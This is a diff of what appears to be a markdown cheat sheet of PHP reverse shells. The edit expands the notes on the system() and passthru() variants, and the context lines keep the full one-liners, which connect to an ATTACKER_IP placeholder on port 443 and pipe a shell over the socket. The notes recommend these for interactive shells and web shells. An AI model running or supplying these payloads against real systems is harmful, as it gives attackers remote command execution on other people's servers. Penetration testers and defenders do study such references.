@@ -388,16 +388,21 @@ Similar to `exec`, but `shell_exec()` returns the command output as a string. Us
 ```bash
 php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
 ```
-`system()` executes the command and immediately displays output. Useful for real-time interaction through the browser or terminal.
-
+- `system()` executes the command and immediately displays output. Useful for real-time interaction through the browser or terminal.
+- Ideal for interactive shells or web shells.
+- Less flexible than `exec()` or `shell_exec()` when handling the result, but great for direct command execution with visible output.
 ---
 
 ### PHP Reverse Shell Using the `passthru` Function
 ```bash
 php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
 ```
-`passthru()` executes commands and directly outputs raw data. Effective when working with binary data over the connection.
-
+- `passthru()` executes commands and directly outputs raw data. Effective when working with binary data over the connection.
+- Unlike `system()`, it does not buffer or interpret the output — it sends it as-is.
+- Best when the command produces binary data (like sending images or files).
+- In a reverse shell context, it works just like `system()`, but may behave more "raw" and direct, especially over a network stream.
+ 
+  
 ---
 
 ### PHP Reverse Shell Using the `popen` Function
